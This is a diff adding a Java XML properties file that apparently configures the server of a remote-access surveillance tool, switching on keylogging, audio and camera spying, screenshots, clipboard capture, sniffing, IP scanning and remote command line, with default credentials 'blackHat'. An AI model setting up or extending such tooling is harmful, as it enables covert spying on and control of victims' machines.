@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">
+<properties>
+<entry key="KEY_KEYBORD">1</entry>
+<entry key="KEY_VIDEO_RECORD">1</entry>
+<entry key="UUID">a5362c3a-1175-4b72-bfac-54df6af71993</entry>
+<entry key="CONNECTION LIMITATION">1</entry>
+<entry key="KEY_AUDIO_SPY_RECORD">1</entry>
+<entry key="KEY_SNIFFER">1</entry>
+<entry key="TYPE_NETWORK">NETWORK</entry>
+<entry key="KEY_MOTION_DETACT">1</entry>
+<entry key="KEY_AUDIO_PHONE">1</entry>
+<entry key="KEY_USB">1</entry>
+<entry key="KEY_CLIPBORD">1</entry>
+<entry key="SHOW_COMPANYNAME"></entry>
+<entry key="KEY_CAMERA">1</entry>
+<entry key="KEY_COMMAND_LINE">1</entry>
+<entry key="TYPE">SERVER</entry>
+<entry key="SHOW_LOGIN">1</entry>
+<entry key="SERVER_PORT">3369</entry>
+<entry key="KEY_VIDEO_LIFE">1</entry>
+<entry key="KEY_IP_SCAN">1</entry>
+<entry key="KEY_AUDIO_SPY_LIFE">1</entry>
+<entry key="PASSWORD">S15A03E19I8</entry>
+<entry key="SIGNIFER">32-1321-32321</entry>
+<entry key="KEY_FILEMANGER_SPY">1</entry>
+<entry key="KEY_VIDEO_SCREENSHOT">1</entry>
+<entry key="KEY_TASKMANGER">1</entry>
+<entry key="KEY_FOOTPRINT">1</entry>
+<entry key="SERVER_IP">127.0.0.1</entry>
+<entry key="AUDIO_IP">0.0.0.0</entry>
+<entry key="AUDIO_PORT">1234</entry>
+<entry key="AUDIO_VOLUM">100</entry>
+<entry key="DEFAULT_LOGIN">blackHat</entry>
+<entry key="DEFAULT_PASSWORD">blackHat</entry>
+<entry key="SHOW_COMPANYNAME"></entry>
+<entry key="RUN_MOTION">0</entry>
+</properties>
